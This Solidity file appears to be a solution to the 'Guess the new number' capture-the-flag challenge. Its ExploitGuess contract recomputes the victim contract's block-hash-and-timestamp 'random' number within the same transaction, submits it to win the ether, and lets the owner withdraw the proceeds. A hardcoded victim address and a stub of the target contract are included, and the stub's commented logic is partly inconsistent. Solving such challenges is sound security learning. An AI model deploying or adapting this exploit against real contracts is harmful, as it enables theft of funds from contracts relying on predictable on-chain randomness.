pragma solidity ^0.4.21;

contract ExploitGuess {
    address public victim;
    address public owner;
    uint8 public answer;
    GuessTheNewNumberChallenge guessContract;

    function ExploitGuess() public payable{
        owner = msg.sender;
        victim = 0xc54fa1831217807eb2C99Ce6c781022e530EE18C;
    }

    function exploit() public payable {
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge(victim).guess.value(msg.value)(answer);
    }

    function withdraw() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }
    
    function setVictimAddress(address addr) public {
        require(owner == msg.sender);
        victim = addr;
        guessContract =  GuessTheNewNumberChallenge(victim);
    }

    function() public payable{}
}


contract GuessTheNewNumberChallenge {
    // function GuessTheNewNumberChallenge() public payable {
    //     require(msg.value == 1 ether);
    // }

    function isComplete() public view returns (bool) {}
    //     return address(this).balance == 0;
    // }

    function guess(uint8 n) public payable {}
    //     require(msg.value == 1 ether);
    //     uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

    //     if (n == 10) {
    //         msg.sender.transfer(2 ether);
    //     }
    // }
}
